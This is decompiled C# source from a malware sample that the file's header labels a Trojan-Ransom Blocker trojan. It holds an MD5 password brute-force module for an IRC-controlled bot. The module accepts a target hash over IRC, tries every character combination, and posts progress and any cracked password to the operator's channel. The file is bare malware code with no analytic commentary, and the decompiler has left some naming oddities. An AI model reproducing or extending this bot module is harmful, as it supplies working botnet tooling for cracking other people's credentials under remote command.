// Decompiled with JetBrains decompiler
// Type: rundll32.bruteforce.md5
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace rundll32.bruteforce
{
  internal class md5
  {
    private static string _md5;
    private static char[] _chars;
    private static int _charCount;
    private static int _nowLength;
    private static int _start;
    private static int _end;
    private static bool _running = false;
    private static string _channel;
    private static irc _irc;
    private static Thread _thread;

    public static void start(
      irc irc,
      string channel,
      string md5,
      string chars,
      int start,
      int end)
    {
      if (md5._running)
        return;
      md5._irc = irc;
      md5._channel = channel;
      md5._md5 = md5;
      md5._chars = chars.ToCharArray();
      md5._charCount = chars.Length;
      md5._nowLength = 0;
      md5._start = start;
      md5._end = end + 1;
      md5._running = true;
      md5._thread = new Thread(new ThreadStart(md5.loadThread));
      md5._thread.Start();
    }

    public static void stop(irc irc, string channel)
    {
      if (!md5._running)
        return;
      md5._running = false;
      md5._thread.Abort();
      md5._irc.sendMessage(md5._channel, ".:MD5 Bruteforce:. - \u000313Stopped bruteforcing!");
    }

    private static void loadThread()
    {
      for (int start = md5._start; start < md5._end; ++start)
        md5.reCurse((object) new md5.curseObj(start, 0, ""));
      md5._irc.sendMessage(md5._channel, ".:MD5 Bruteforce:. - \u000313Couldn't find password!");
      md5.stop(md5._irc, md5._channel);
    }

    private static void reCurse(object c)
    {
      if (md5._nowLength != ((md5.curseObj) c).length)
      {
        md5._nowLength = ((md5.curseObj) c).length;
        md5._irc.sendMessage(md5._channel, ".:MD5 Bruteforce:. - \u000313Now testing password with a length of \u000306 " + (object) md5._nowLength + "\u000313 chars!");
      }
      if (((md5.curseObj) c).pos >= ((md5.curseObj) c).length + 1)
        return;
      for (int index = 0; index < md5._charCount; ++index)
        md5.reCurse((object) new md5.curseObj(((md5.curseObj) c).length, ((md5.curseObj) c).pos + 1, ((md5.curseObj) c).baseS + (object) md5._chars[index]));
      if (!(md5._md5 == md5.HashString(((md5.curseObj) c).baseS)))
        return;
      md5._irc.sendMessage(md5._channel, ".:MD5 Bruteforce:. - \u000313Password found:\u000306 " + ((md5.curseObj) c).baseS + "\u000313 !");
      md5.stop(md5._irc, md5._channel);
    }

    private static string HashString(string Value)
    {
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(Value));
      string str = "";
      for (int index = 0; index < hash.Length; ++index)
        str += hash[index].ToString("x2").ToLower();
      return str;
    }

    private struct curseObj
    {
      public int length;
      public int pos;
      public string baseS;

      public curseObj(int length, int pos, string baseS)
      {
        this.length = length;
        this.pos = pos;
        this.baseS = baseS;
      }
    }
  }
}
